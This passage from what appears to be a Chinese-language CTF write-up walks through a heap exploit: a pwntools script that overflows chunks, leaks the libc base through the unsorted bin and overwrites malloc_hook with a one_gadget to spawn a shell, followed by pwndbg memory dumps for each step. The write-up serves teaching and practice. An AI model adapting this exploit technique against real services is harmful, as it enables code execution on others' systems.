class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-comment">#首先申请4个fast chunk和1个small chunk</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br><br><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4</span><br><span class="hljs-comment">#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80</span><br><span class="hljs-comment">#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br><br><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br><span class="hljs-comment">#为了让index4能够被放到unsortedbins中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#再申请一个防止index4与top chunk合并了</span><br>alloc(<span class="hljs-number">0x80</span>)<br><br><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(文末有工具算)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#此时因为fastbins中没有了,所以从unsortedbins中找</span><br>alloc(<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment">#index2还是指向index4那个地方我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br><br><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index6</span><br><br><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-comment">#再申请一下触发one_gadget</span><br>alloc(<span class="hljs-number">255</span>)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：</p><ul><li>利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）</li><li>利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。</li></ul><h3 id="1-leak-libc-addr"><a href="#1-leak-libc-addr" class="headerlink" title="1. leak libc_addr"></a>1. leak libc_addr</h3><h4 id="1-1-模仿程序功能"><a href="#1-1-模仿程序功能" class="headerlink" title="1-1 模仿程序功能"></a>1-1 模仿程序功能</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br></code></pre></td></tr></tbody></table></figure><p>这4个函数分别对应程序的四个主要功能，这里就不多说了。</p><h4 id="1-2-申请-5个chunk"><a href="#1-2-申请-5个chunk" class="headerlink" title="1-2 申请 5个chunk"></a>1-2 申请 5个chunk</h4><p>由于我们希望使用 unsorted bin 来泄漏 libc 基地址，<strong>所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。</strong>具体设计如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br></code></pre></td></tr></tbody></table></figure><p>执行完此payload之后的heap情况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">50</span>gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index0<br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index1<br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index2<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index3<br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> #index4<br>......（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> #top_chunk<br></code></pre></td></tr></tbody></table></figure><p>此时程序结构体中的情况：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98720</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    #index1<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757030</span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     #index2<br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757050</span><span class="hljs-number">0x0000000000000001</span><br>    #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-3-free创建的index1和index2"><a href="#1-3-free创建的index1和index2" class="headerlink" title="1-3 free创建的index1和index2"></a>1-3 free创建的index1和index2</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><p>执行此部分payload，来看一下堆状况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#fd指针指向index1的起始地址</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>此时的bin和main_arena情况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0000555555757020</span>-&gt;<span class="hljs-number">0x555555757040</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757040</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757110</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>程序的结构体状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #index1（chunk_flag置零）<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                #chunk_content_size置零   #chunk_data_ptr置空     <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>     #index2（chunk_flag置零）  #chunk_data_size置零     <br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    #chunk_data_ptr置空  #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针"><a href="#1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针" class="headerlink" title="1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针"></a>1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br></code></pre></td></tr></tbody></table></figure><p>还记得上面提到的程序漏洞吗？<br>第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的chunk_content_size写入到结构体中，并且之前alloc chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。<br>这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。<br>执行payload之后的内存空间如下：</p><blockquote><p>chunk2-&gt;fd已成功修改为chunk4的起始地址（这个起始地址是指向chunk header的）</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#payload从这里开始修改堆块内容</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#此处的fd指针已经被修改</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>--------------------------------------------------------------    <br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><h4 id="1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21"><a href="#1-5-对-index3-进行fill操作，将-index4-的大小修改为-0x21" class="headerlink" title="1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21"></a>1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4（fastbin）</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span 